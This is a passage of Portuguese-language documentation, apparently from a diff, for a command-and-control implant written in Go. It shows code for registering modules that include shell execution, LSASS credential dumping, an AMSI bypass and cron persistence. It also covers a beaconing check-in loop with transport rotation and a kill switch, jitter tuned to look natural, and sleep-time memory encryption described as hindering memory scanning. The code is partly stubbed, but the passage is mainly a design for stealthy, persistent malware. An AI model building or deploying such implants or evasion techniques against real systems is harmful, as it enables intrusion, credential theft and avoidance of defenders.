+<a href="#__codelineno-3-11" id="__codelineno-3-11" name="__codelineno-3-11"></a><span class="w">    </span><span class="nx">time</span><span class="p">.</span><span class="nx">Sleep</span><span class="p">(</span><span class="nx">baseRegistrationDelay</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">jitter</span><span class="p">)</span>
+<a href="#__codelineno-3-12" id="__codelineno-3-12" name="__codelineno-3-12"></a><span class="p">}</span>
+</code></pre></div>
+<h3 id="sysinfo-platform-specific">Sysinfo Platform-Specific<a class="headerlink" href="#sysinfo-platform-specific" title="Permanent link">¶</a></h3>
+<p>A coleta de sysinfo usa build tags para codigo platform-specific:</p>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-4-1" id="__codelineno-4-1" name="__codelineno-4-1"></a><span class="c1">// cmd/implant/sysinfo_linux.go</span>
+<a href="#__codelineno-4-2" id="__codelineno-4-2" name="__codelineno-4-2"></a><span class="c1">//go:build linux</span>
+<a href="#__codelineno-4-3" id="__codelineno-4-3" name="__codelineno-4-3"></a><span class="kd">func</span><span class="w"> </span><span class="nx">newPlatformSysInfo</span><span class="p">()</span><span class="w"> </span><span class="nx">evasion</span><span class="p">.</span><span class="nx">SystemInfo</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-4-4" id="__codelineno-4-4" name="__codelineno-4-4"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="o">&amp;</span><span class="nx">evasion</span><span class="p">.</span><span class="nx">RealSystemInfo</span><span class="p">{}</span>
+<a href="#__codelineno-4-5" id="__codelineno-4-5" name="__codelineno-4-5"></a><span class="p">}</span>
+<a href="#__codelineno-4-6" id="__codelineno-4-6" name="__codelineno-4-6"></a>
+<a href="#__codelineno-4-7" id="__codelineno-4-7" name="__codelineno-4-7"></a><span class="c1">// cmd/implant/sysinfo_windows.go</span>
+<a href="#__codelineno-4-8" id="__codelineno-4-8" name="__codelineno-4-8"></a><span class="c1">//go:build windows</span>
+<a href="#__codelineno-4-9" id="__codelineno-4-9" name="__codelineno-4-9"></a><span class="kd">func</span><span class="w"> </span><span class="nx">newPlatformSysInfo</span><span class="p">()</span><span class="w"> </span><span class="nx">evasion</span><span class="p">.</span><span class="nx">SystemInfo</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-4-10" id="__codelineno-4-10" name="__codelineno-4-10"></a><span class="w">    </span><span class="c1">// Usa APIs Windows para WMI, registry, etc.</span>
+<a href="#__codelineno-4-11" id="__codelineno-4-11" name="__codelineno-4-11"></a><span class="p">}</span>
+</code></pre></div>
+<h2 id="fase-5-module-system">Fase 5: Module System<a class="headerlink" href="#fase-5-module-system" title="Permanent link">¶</a></h2>
+<p>O implant registra todos os modulos estaticos no boot. Modulos nao suportados pela plataforma sao silenciosamente ignorados:</p>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-5-1" id="__codelineno-5-1" name="__codelineno-5-1"></a><span class="kd">func</span><span class="w"> </span><span class="nx">registerAllModules</span><span class="p">(</span><span class="nx">registry</span><span class="w"> </span><span class="o">*</span><span class="nx">module</span><span class="p">.</span><span class="nx">Registry</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-5-2" id="__codelineno-5-2" name="__codelineno-5-2"></a><span class="w">    </span><span class="nx">modules</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="p">[]</span><span class="nx">module</span><span class="p">.</span><span class="nx">Module</span><span class="p">{</span>
+<a href="#__codelineno-5-3" id="__codelineno-5-3" name="__codelineno-5-3"></a><span class="w">        </span><span class="o">&amp;</span><span class="nx">shell</span><span class="p">.</span><span class="nx">ShellModule</span><span class="p">{},</span><span class="w">           </span><span class="c1">// all platforms</span>
+<a href="#__codelineno-5-4" id="__codelineno-5-4" name="__codelineno-5-4"></a><span class="w">        </span><span class="o">&amp;</span><span class="nx">shell</span><span class="p">.</span><span class="nx">ExecModule</span><span class="p">{},</span><span class="w">            </span><span class="c1">// all platforms</span>
+<a href="#__codelineno-5-5" id="__codelineno-5-5" name="__codelineno-5-5"></a><span class="w">        </span><span class="o">&amp;</span><span class="nx">credential</span><span class="p">.</span><span class="nx">LsassDumpModule</span><span class="p">{},</span><span class="w">  </span><span class="c1">// Windows only — skip on Linux</span>
+<a href="#__codelineno-5-6" id="__codelineno-5-6" name="__codelineno-5-6"></a><span class="w">        </span><span class="nx">evasion</span><span class="p">.</span><span class="nx">NewAMSIBypass</span><span class="p">(),</span><span class="w">        </span><span class="c1">// Windows only</span>
+<a href="#__codelineno-5-7" id="__codelineno-5-7" name="__codelineno-5-7"></a><span class="w">        </span><span class="nx">persist</span><span class="p">.</span><span class="nx">NewCronModule</span><span class="p">(</span><span class="nx">tracker</span><span class="p">),</span><span class="w"> </span><span class="c1">// Linux only</span>
+<a href="#__codelineno-5-8" id="__codelineno-5-8" name="__codelineno-5-8"></a><span class="w">        </span><span class="c1">// ...</span>
+<a href="#__codelineno-5-9" id="__codelineno-5-9" name="__codelineno-5-9"></a><span class="w">    </span><span class="p">}</span>
+<a href="#__codelineno-5-10" id="__codelineno-5-10" name="__codelineno-5-10"></a><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="nx">_</span><span class="p">,</span><span class="w"> </span><span class="nx">m</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="k">range</span><span class="w"> </span><span class="nx">modules</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-5-11" id="__codelineno-5-11" name="__codelineno-5-11"></a><span class="w">        </span><span class="nx">registry</span><span class="p">.</span><span class="nx">RegisterModule</span><span class="p">(</span><span class="nx">m</span><span class="p">)</span><span class="w"> </span><span class="c1">// checks m.OS() vs runtime.GOOS</span>
+<a href="#__codelineno-5-12" id="__codelineno-5-12" name="__codelineno-5-12"></a><span class="w">    </span><span class="p">}</span>
+<a href="#__codelineno-5-13" id="__codelineno-5-13" name="__codelineno-5-13"></a><span class="p">}</span>
+</code></pre></div>
+<h3 id="bridge-task-module-result">Bridge: Task -&gt; Module -&gt; Result<a class="headerlink" href="#bridge-task-module-result" title="Permanent link">¶</a></h3>
+<p>O bridge conecta o sistema de tasks ao sistema de modulos:</p>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-6-1" id="__codelineno-6-1" name="__codelineno-6-1"></a><span class="nx">bridge</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="kd">func</span><span class="p">(</span><span class="nx">task</span><span class="w"> </span><span class="nx">taskDispatch</span><span class="p">)</span><span class="w"> </span><span class="nx">taskResult</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-6-2" id="__codelineno-6-2" name="__codelineno-6-2"></a><span class="w">    </span><span class="nx">args</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">module</span><span class="p">.</span><span class="nx">ModuleArgs</span><span class="p">{</span><span class="nx">Raw</span><span class="p">:</span><span class="w"> </span><span class="nx">task</span><span class="p">.</span><span class="nx">Args</span><span class="p">}</span>
+<a href="#__codelineno-6-3" id="__codelineno-6-3" name="__codelineno-6-3"></a><span class="w">    </span><span class="nx">result</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">executor</span><span class="p">.</span><span class="nx">Execute</span><span class="p">(</span><span class="nx">ctx</span><span class="p">,</span><span class="w"> </span><span class="nx">task</span><span class="p">.</span><span class="nx">Module</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">)</span>
+<a href="#__codelineno-6-4" id="__codelineno-6-4" name="__codelineno-6-4"></a>
+<a href="#__codelineno-6-5" id="__codelineno-6-5" name="__codelineno-6-5"></a><span class="w">    </span><span class="c1">// Fallback: modulo nao encontrado no registry estatico</span>
+<a href="#__codelineno-6-6" id="__codelineno-6-6" name="__codelineno-6-6"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">errors</span><span class="p">.</span><span class="nx">Is</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="w"> </span><span class="nx">module</span><span class="p">.</span><span class="nx">ErrModuleNotFound</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">modLoader</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-6-7" id="__codelineno-6-7" name="__codelineno-6-7"></a><span class="w">        </span><span class="nx">output</span><span class="p">,</span><span class="w"> </span><span class="nx">loadErr</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">modLoader</span><span class="p">.</span><span class="nx">LoadAndExecute</span><span class="p">(</span><span class="nx">ctx</span><span class="p">,</span><span class="w"> </span><span class="nx">task</span><span class="p">.</span><span class="nx">Module</span><span class="p">,</span><span class="w"> </span><span class="nx">task</span><span class="p">.</span><span class="nx">Args</span><span class="p">)</span>
+<a href="#__codelineno-6-8" id="__codelineno-6-8" name="__codelineno-6-8"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="nx">loadErr</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-6-9" id="__codelineno-6-9" name="__codelineno-6-9"></a><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nx">taskResult</span><span class="p">{</span><span class="nx">Status</span><span class="p">:</span><span class="w"> </span><span class="s">"completed"</span><span class="p">,</span><span class="w"> </span><span class="nx">Result</span><span class="p">:</span><span class="w"> </span><span class="nx">output</span><span class="p">}</span>
+<a href="#__codelineno-6-10" id="__codelineno-6-10" name="__codelineno-6-10"></a><span class="w">        </span><span class="p">}</span>
+<a href="#__codelineno-6-11" id="__codelineno-6-11" name="__codelineno-6-11"></a><span class="w">    </span><span class="p">}</span>
+<a href="#__codelineno-6-12" id="__codelineno-6-12" name="__codelineno-6-12"></a><span class="w">    </span><span class="c1">// ...</span>
+<a href="#__codelineno-6-13" id="__codelineno-6-13" name="__codelineno-6-13"></a><span class="p">}</span>
+</code></pre></div>
+<h2 id="fase-7-check-in-loop">Fase 7: Check-in Loop<a class="headerlink" href="#fase-7-check-in-loop" title="Permanent link">¶</a></h2>
+<pre class="mermaid"><code>stateDiagram-v2
+    [*] --&gt; Sleeping: Boot completo
+
+    Sleeping --&gt; CheckIn: Timer expira<br/>(sleep + jitter)
+
+    CheckIn --&gt; SelectTransport: Reconnector.CurrentImplantTransport()
+    SelectTransport --&gt; NoTransport: nil
+    NoTransport --&gt; [*]: Error fatal
+
+    SelectTransport --&gt; SendCheckIn: Transport disponivel
+    SendCheckIn --&gt; CheckInFailed: Erro de rede
+    SendCheckIn --&gt; CheckInOK: Sucesso
+
+    CheckInFailed --&gt; RecordFailure: Reconnector.RecordFailure()
+    RecordFailure --&gt; KillSwitch: Total failures &gt;= max
+    KillSwitch --&gt; [*]: ErrKillSwitch
+
+    RecordFailure --&gt; RotateURL: Proximo callback URL
+    RotateURL --&gt; SwitchTransport: Consecutive &gt;= maxTransportFailures
+    RotateURL --&gt; WaitBackoff: Abaixo do threshold
+    SwitchTransport --&gt; WaitBackoff: Proximo transport na chain
+    WaitBackoff --&gt; Sleeping: Exponential backoff
+
+    CheckInOK --&gt; ResetCounters: RecordSuccess()
+    ResetCounters --&gt; HasTasks: Tasks recebidas?
+
+    HasTasks --&gt; ExecuteTask: Sim
+    HasTasks --&gt; Sleeping: Nao
+
+    ExecuteTask --&gt; SendResult: bridge(task)
+    SendResult --&gt; ResultFailed: Erro (retry 3x)
+    SendResult --&gt; ResultOK: Sucesso
+    ResultFailed --&gt; NextTask: Log warning
+    ResultOK --&gt; NextTask: seq++
+
+    NextTask --&gt; HasMoreTasks: Mais tasks?
+    HasMoreTasks --&gt; ExecuteTask: Sim
+    HasMoreTasks --&gt; Sleeping: Nao
+</code></pre>
+<h3 id="implementacao-do-loop">Implementacao do Loop<a class="headerlink" href="#implementacao-do-loop" title="Permanent link">¶</a></h3>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-7-1" id="__codelineno-7-1" name="__codelineno-7-1"></a><span class="c1">// cmd/implant/checkin.go</span>
+<a href="#__codelineno-7-2" id="__codelineno-7-2" name="__codelineno-7-2"></a><span class="kd">func</span><span class="w"> </span><span class="nx">CheckInLoop</span><span class="p">(</span><span class="nx">ctx</span><span class="w"> </span><span class="nx">context</span><span class="p">.</span><span class="nx">Context</span><span class="p">,</span><span class="w"> </span><span class="nx">cfg</span><span class="w"> </span><span class="o">*</span><span class="nx">ImplantConfig</span><span class="p">,</span><span class="w"> </span><span class="nx">session</span><span class="w"> </span><span class="o">*</span><span class="nx">AgentSession</span><span class="p">,</span>
+<a href="#__codelineno-7-3" id="__codelineno-7-3" name="__codelineno-7-3"></a><span class="w">    </span><span class="nx">recon</span><span class="w"> </span><span class="o">*</span><span class="nx">Reconnector</span><span class="p">,</span><span class="w"> </span><span class="nx">executor</span><span class="w"> </span><span class="nx">ModuleExecutor</span><span class="p">)</span><span class="w"> </span><span class="kt">error</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-7-4" id="__codelineno-7-4" name="__codelineno-7-4"></a>
+<a href="#__codelineno-7-5" id="__codelineno-7-5" name="__codelineno-7-5"></a><span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">seq</span><span class="w"> </span><span class="kt">uint64</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nb">uint64</span><span class="p">(</span><span class="nx">recon</span><span class="p">.</span><span class="nx">ResumeSeq</span><span class="p">())</span>
+<a href="#__codelineno-7-6" id="__codelineno-7-6" name="__codelineno-7-6"></a>
+<a href="#__codelineno-7-7" id="__codelineno-7-7" name="__codelineno-7-7"></a><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-7-8" id="__codelineno-7-8" name="__codelineno-7-8"></a><span class="w">        </span><span class="c1">// Guarda contra exaustao de nonce</span>
+<a href="#__codelineno-7-9" id="__codelineno-7-9" name="__codelineno-7-9"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="nx">seq</span><span class="w"> </span><span class="p">&gt;</span><span class="w"> </span><span class="nx">math</span><span class="p">.</span><span class="nx">MaxUint32</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-7-10" id="__codelineno-7-10" name="__codelineno-7-10"></a><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nx">fmt</span><span class="p">.</span><span class="nx">Errorf</span><span class="p">(</span><span class="s">"crypto: sequence exhausted"</span><span class="p">)</span>
+<a href="#__codelineno-7-11" id="__codelineno-7-11" name="__codelineno-7-11"></a><span class="w">        </span><span class="p">}</span>
+<a href="#__codelineno-7-12" id="__codelineno-7-12" name="__codelineno-7-12"></a>
+<a href="#__codelineno-7-13" id="__codelineno-7-13" name="__codelineno-7-13"></a><span class="w">        </span><span class="c1">// 1. Seleciona transport ativo</span>
+<a href="#__codelineno-7-14" id="__codelineno-7-14" name="__codelineno-7-14"></a><span class="w">        </span><span class="nx">tr</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">recon</span><span class="p">.</span><span class="nx">CurrentImplantTransport</span><span class="p">()</span>
+<a href="#__codelineno-7-15" id="__codelineno-7-15" name="__codelineno-7-15"></a>
+<a href="#__codelineno-7-16" id="__codelineno-7-16" name="__codelineno-7-16"></a><span class="w">        </span><span class="c1">// 2. Check-in</span>
+<a href="#__codelineno-7-17" id="__codelineno-7-17" name="__codelineno-7-17"></a><span class="w">        </span><span class="nx">tasks</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">tr</span><span class="p">.</span><span class="nx">CheckIn</span><span class="p">(</span><span class="nx">ctx</span><span class="p">,</span><span class="w"> </span><span class="nx">session</span><span class="p">,</span><span class="w"> </span><span class="nb">uint32</span><span class="p">(</span><span class="nx">seq</span><span class="p">))</span>
+<a href="#__codelineno-7-18" id="__codelineno-7-18" name="__codelineno-7-18"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-7-19" id="__codelineno-7-19" name="__codelineno-7-19"></a><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="nx">killErr</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">recon</span><span class="p">.</span><span class="nx">RecordFailure</span><span class="p">();</span><span class="w"> </span><span class="nx">killErr</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-7-20" id="__codelineno-7-20" name="__codelineno-7-20"></a><span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="nx">killErr</span><span class="w"> </span><span class="c1">// kill switch triggered</span>
+<a href="#__codelineno-7-21" id="__codelineno-7-21" name="__codelineno-7-21"></a><span class="w">            </span><span class="p">}</span>
+<a href="#__codelineno-7-22" id="__codelineno-7-22" name="__codelineno-7-22"></a><span class="w">            </span><span class="nx">recon</span><span class="p">.</span><span class="nx">WaitBackoff</span><span class="p">(</span><span class="nx">ctx</span><span class="p">)</span><span class="w"> </span><span class="c1">// exponential backoff</span>
+<a href="#__codelineno-7-23" id="__codelineno-7-23" name="__codelineno-7-23"></a><span class="w">            </span><span class="k">continue</span>
+<a href="#__codelineno-7-24" id="__codelineno-7-24" name="__codelineno-7-24"></a><span class="w">        </span><span class="p">}</span>
+<a href="#__codelineno-7-25" id="__codelineno-7-25" name="__codelineno-7-25"></a>
+<a href="#__codelineno-7-26" id="__codelineno-7-26" name="__codelineno-7-26"></a><span class="w">        </span><span class="c1">// 3. Sucesso — reset counters</span>
+<a href="#__codelineno-7-27" id="__codelineno-7-27" name="__codelineno-7-27"></a><span class="w">        </span><span class="nx">seq</span><span class="o">++</span>
+<a href="#__codelineno-7-28" id="__codelineno-7-28" name="__codelineno-7-28"></a><span class="w">        </span><span class="nx">recon</span><span class="p">.</span><span class="nx">RecordSuccess</span><span class="p">(</span><span class="nb">uint32</span><span class="p">(</span><span class="nx">seq</span><span class="p">))</span>
+<a href="#__codelineno-7-29" id="__codelineno-7-29" name="__codelineno-7-29"></a>
+<a href="#__codelineno-7-30" id="__codelineno-7-30" name="__codelineno-7-30"></a><span class="w">        </span><span class="c1">// 4. Executa tasks</span>
+<a href="#__codelineno-7-31" id="__codelineno-7-31" name="__codelineno-7-31"></a><span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="nx">_</span><span class="p">,</span><span class="w"> </span><span class="nx">task</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="k">range</span><span class="w"> </span><span class="nx">tasks</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-7-32" id="__codelineno-7-32" name="__codelineno-7-32"></a><span class="w">            </span><span class="nx">result</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">executor</span><span class="p">(</span><span class="nx">task</span><span class="p">)</span>
+<a href="#__codelineno-7-33" id="__codelineno-7-33" name="__codelineno-7-33"></a><span class="w">            </span><span class="c1">// Retry 3x com backoff 100ms, 200ms, 400ms</span>
+<a href="#__codelineno-7-34" id="__codelineno-7-34" name="__codelineno-7-34"></a><span class="w">            </span><span class="k">for</span><span class="w"> </span><span class="nx">attempt</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="nx">attempt</span><span class="w"> </span><span class="p">&lt;</span><span class="w"> </span><span class="mi">3</span><span class="p">;</span><span class="w"> </span><span class="nx">attempt</span><span class="o">++</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-7-35" id="__codelineno-7-35" name="__codelineno-7-35"></a><span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="nx">sendErr</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">tr</span><span class="p">.</span><span class="nx">SendResult</span><span class="p">(</span><span class="nx">ctx</span><span class="p">,</span><span class="w"> </span><span class="nx">session</span><span class="p">,</span><span class="w"> </span><span class="nb">uint32</span><span class="p">(</span><span class="nx">seq</span><span class="p">),</span><span class="w"> </span><span class="nx">result</span><span class="p">);</span><span class="w"> </span><span class="nx">sendErr</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-7-36" id="__codelineno-7-36" name="__codelineno-7-36"></a><span class="w">                    </span><span class="nx">seq</span><span class="o">++</span>
+<a href="#__codelineno-7-37" id="__codelineno-7-37" name="__codelineno-7-37"></a><span class="w">                    </span><span class="k">break</span>
+<a href="#__codelineno-7-38" id="__codelineno-7-38" name="__codelineno-7-38"></a><span class="w">                </span><span class="p">}</span>
+<a href="#__codelineno-7-39" id="__codelineno-7-39" name="__codelineno-7-39"></a><span class="w">                </span><span class="nx">time</span><span class="p">.</span><span class="nx">After</span><span class="p">(</span><span class="nx">time</span><span class="p">.</span><span class="nx">Duration</span><span class="p">(</span><span class="mi">100</span><span class="o">&lt;&lt;</span><span class="nb">uint</span><span class="p">(</span><span class="nx">attempt</span><span class="p">))</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nx">time</span><span class="p">.</span><span class="nx">Millisecond</span><span class="p">)</span>
+<a href="#__codelineno-7-40" id="__codelineno-7-40" name="__codelineno-7-40"></a><span class="w">            </span><span class="p">}</span>
+<a href="#__codelineno-7-41" id="__codelineno-7-41" name="__codelineno-7-41"></a><span class="w">        </span><span class="p">}</span>
+<a href="#__codelineno-7-42" id="__codelineno-7-42" name="__codelineno-7-42"></a>
+<a href="#__codelineno-7-43" id="__codelineno-7-43" name="__codelineno-7-43"></a><span class="w">        </span><span class="c1">// 5. Sleep com jitter</span>
+<a href="#__codelineno-7-44" id="__codelineno-7-44" name="__codelineno-7-44"></a><span class="w">        </span><span class="nx">sleepDur</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">jitteredSleep</span><span class="p">(</span><span class="nx">cfg</span><span class="p">.</span><span class="nx">Sleep</span><span class="p">,</span><span class="w"> </span><span class="nx">cfg</span><span class="p">.</span><span class="nx">Jitter</span><span class="p">)</span>
+<a href="#__codelineno-7-45" id="__codelineno-7-45" name="__codelineno-7-45"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="nx">cfg</span><span class="p">.</span><span class="nx">SleepEncrypt</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-7-46" id="__codelineno-7-46" name="__codelineno-7-46"></a><span class="w">            </span><span class="nx">obfuscatedSleep</span><span class="p">(</span><span class="nx">sleepDur</span><span class="p">)</span><span class="w"> </span><span class="c1">// cifra memoria durante sleep</span>
+<a href="#__codelineno-7-47" id="__codelineno-7-47" name="__codelineno-7-47"></a><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-7-48" id="__codelineno-7-48" name="__codelineno-7-48"></a><span class="w">            </span><span class="nx">time</span><span class="p">.</span><span class="nx">Sleep</span><span class="p">(</span><span class="nx">sleepDur</span><span class="p">)</span>
+<a href="#__codelineno-7-49" id="__codelineno-7-49" name="__codelineno-7-49"></a><span class="w">        </span><span class="p">}</span>
+<a href="#__codelineno-7-50" id="__codelineno-7-50" name="__codelineno-7-50"></a><span class="w">    </span><span class="p">}</span>
+<a href="#__codelineno-7-51" id="__codelineno-7-51" name="__codelineno-7-51"></a><span class="p">}</span>
+</code></pre></div>
+<h3 id="jitter-com-distribuicao-normal">Jitter com Distribuicao Normal<a class="headerlink" href="#jitter-com-distribuicao-normal" title="Permanent link">¶</a></h3>
+<p>O jitter usa distribuicao Gaussiana (nao uniforme) para um padrao de timing mais natural:</p>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-8-1" id="__codelineno-8-1" name="__codelineno-8-1"></a><span class="kd">func</span><span class="w"> </span><span class="nx">jitteredSleep</span><span class="p">(</span><span class="nx">baseMs</span><span class="w"> </span><span class="kt">int</span><span class="p">,</span><span class="w"> </span><span class="nx">jitterPct</span><span class="w"> </span><span class="kt">int</span><span class="p">)</span><span class="w"> </span><span class="nx">time</span><span class="p">.</span><span class="nx">Duration</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-8-2" id="__codelineno-8-2" name="__codelineno-8-2"></a><span class="w">    </span><span class="nx">maxDeviation</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nb">float64</span><span class="p">(</span><span class="nx">baseMs</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nb">float64</span><span class="p">(</span><span class="nx">jitterPct</span><span class="p">)</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mf">100.0</span>
+<a href="#__codelineno-8-3" id="__codelineno-8-3" name="__codelineno-8-3"></a><span class="w">    </span><span class="nx">stddev</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">maxDeviation</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mf">3.0</span><span class="w"> </span><span class="c1">// 99.7% dentro de ±jitterPct%</span>
+<a href="#__codelineno-8-4" id="__codelineno-8-4" name="__codelineno-8-4"></a>
+<a href="#__codelineno-8-5" id="__codelineno-8-5" name="__codelineno-8-5"></a><span class="w">    </span><span class="nx">jittered</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nb">float64</span><span class="p">(</span><span class="nx">baseMs</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">rand</span><span class="p">.</span><span class="nx">NormFloat64</span><span class="p">()</span><span class="o">*</span><span class="nx">stddev</span>
+<a href="#__codelineno-8-6" id="__codelineno-8-6" name="__codelineno-8-6"></a>
+<a href="#__codelineno-8-7" id="__codelineno-8-7" name="__codelineno-8-7"></a><span class="w">    </span><span class="c1">// Clamp: [100ms, base + maxDeviation]</span>
+<a href="#__codelineno-8-8" id="__codelineno-8-8" name="__codelineno-8-8"></a><span class="w">    </span><span class="nx">jittered</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">math</span><span class="p">.</span><span class="nx">Max</span><span class="p">(</span><span class="mf">100.0</span><span class="p">,</span><span class="w"> </span><span class="nx">math</span><span class="p">.</span><span class="nx">Min</span><span class="p">(</span><span class="nx">jittered</span><span class="p">,</span><span class="w"> </span><span class="nb">float64</span><span class="p">(</span><span class="nx">baseMs</span><span class="p">)</span><span class="o">+</span><span class="nx">maxDeviation</span><span class="p">))</span>
+<a href="#__codelineno-8-9" id="__codelineno-8-9" name="__codelineno-8-9"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">time</span><span class="p">.</span><span class="nx">Duration</span><span class="p">(</span><span class="nx">jittered</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nx">time</span><span class="p">.</span><span class="nx">Millisecond</span>
+<a href="#__codelineno-8-10" id="__codelineno-8-10" name="__codelineno-8-10"></a><span class="p">}</span>
+</code></pre></div>
+<p><strong>Por que Gaussian e nao uniforme?</strong> Distribuicao normal concentra a maioria dos valores perto do base interval, com desvios extremos sendo raros. Isso produz um padrao de timing mais realista que distribuicao uniforme.</p>
+<h3 id="sleep-encryption-windows">Sleep Encryption (Windows)<a class="headerlink" href="#sleep-encryption-windows" title="Permanent link">¶</a></h3>
+<p>No Windows, o implant pode cifrar sua propria memoria durante o sleep:</p>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-9-1" id="__codelineno-9-1" name="__codelineno-9-1"></a><span class="c1">// cmd/implant/evasion_windows.go</span>
+<a href="#__codelineno-9-2" id="__codelineno-9-2" name="__codelineno-9-2"></a><span class="kd">func</span><span class="w"> </span><span class="nx">platformObfuscatedSleep</span><span class="p">(</span><span class="nx">dur</span><span class="w"> </span><span class="nx">time</span><span class="p">.</span><span class="nx">Duration</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-9-3" id="__codelineno-9-3" name="__codelineno-9-3"></a><span class="w">    </span><span class="nx">obf</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">evasion</span><span class="p">.</span><span class="nx">DefaultSleepObfuscator</span><span class="p">()</span>
+<a href="#__codelineno-9-4" id="__codelineno-9-4" name="__codelineno-9-4"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">obf</span><span class="p">.</span><span class="nx">ObfuscatedSleep</span><span class="p">(</span><span class="nx">dur</span><span class="p">);</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span>
+<a href="#__codelineno-9-5" id="__codelineno-9-5" name="__codelineno-9-5"></a><span class="w">        </span><span class="nx">time</span><span class="p">.</span><span class="nx">Sleep</span><span class="p">(</span><span class="nx">dur</span><span class="p">)</span><span class="w"> </span><span class="c1">// fallback</span>
+<a href="#__codelineno-9-6" id="__codelineno-9-6" name="__codelineno-9-6"></a><span class="w">    </span><span class="p">}</span>
+<a href="#__codelineno-9-7" id="__codelineno-9-7" name="__codelineno-9-7"></a><span class="p">}</span>
+</code></pre></div>
+<p>Isso dificulta memory scanning durante o periodo de idle. As regioes de modulos dinamicos carregados tambem sao incluidas no pass de cifragem via <code>ModuleCache.Regions()</code>.</p>
+<h2 id="reconnector-resiliencia-de-comunicacao">Reconnector — Resiliencia de Comunicacao<a class="headerlink" href="#reconnector-resiliencia-de-comunicacao" title="Permanent link">¶</a></h2>
+<p>O <code>Reconnector</code> gerencia tres mecanismos de resiliencia:</p>
